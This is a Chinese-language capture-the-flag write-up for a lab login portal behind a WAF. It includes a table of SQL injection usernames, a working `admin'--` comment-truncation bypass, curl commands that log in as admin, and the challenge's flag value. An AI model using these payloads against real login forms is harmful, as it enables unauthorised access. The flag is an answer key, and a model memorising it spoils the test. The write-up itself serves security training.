## 题目原文

> 某面向国际用户的门户支持多语言输入，并在边界部署 Web 防护设备过滤恶意请求，后端在处理输入时存在弱点。已获授权进行红队评估，设法穿透边界防护并取得仅管理员可见的受保护 flag。

## 题解

### 入口与指纹

登录页标题 `Login — Global Portal`，表单带 `accept-charset="UTF-8"`。页面上有一行说明：`This portal supports international characters (Unicode)`，脚注仍是 `Protected by WAF`。`nginx/1.30.1`，PHP 会话。

### 关键观察

后端还是拼接用户名的登录 SQL。ASCII 的注释截断就能过，不需要先把关键字换成全角。

| 用户名 | 结果 |
| --- | --- |
| `admin` | 200，口令错误 |
| `admin' or '1'='1` | 403 |
| `admin'--`、`admin'-- -`、`admin'/**/-- -`、`admin' -- -` | 302 到 `dashboard.php` |
| `admin'#` | 200，口令错误 |
| `admin\'-- -` | 200，口令错误。反斜杠把引号转义了，语句没有断开 |
| 全角引号 `admin＇-- -` | 没有进入仪表盘 |

### 利用链

```bash
T=$(head -1 .target)
curl -sS -c cj -b cj -D - -o /dev/null \
  --data-urlencode "username=admin'--" \
  --data-urlencode "password=x" \
  "http://$T/"
curl -sS -b cj "http://$T/dashboard.php"
```

仪表盘标题 `Dashboard — Global Portal`。本次平台接受的值是 `flag{263d6fc2-7c7e-4b4f-91ab-ac1d5dbfdae0}`。

### flag 位置

登录后的 `dashboard.php`。
